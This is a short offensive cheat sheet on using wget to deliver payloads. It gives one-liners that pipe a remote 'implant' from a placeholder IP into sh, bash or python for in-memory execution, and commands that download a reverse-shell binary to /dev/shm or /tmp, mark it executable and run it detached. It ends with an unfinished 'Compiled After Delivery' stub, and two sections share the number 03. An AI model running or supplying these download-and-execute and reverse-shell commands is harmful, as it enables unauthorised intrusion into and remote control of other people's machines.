# Wget

## 01 - Fileless code execution

This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.

```
$ wget -qO- http[s]://<IP>/implant.sh | sh

$ wget -qO- http[s]://<IP>/implant.sh | bash

$ wget -qO- http[s]://<IP>/implant.py | python
```

## 02 - Dropping on memory

Download reverse shell binary and execute it.

```
$ wget -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
```

## 03 - Dropping on disk

Download reverse shell binary and execute it.

```
$ wget -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
```

## 03 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```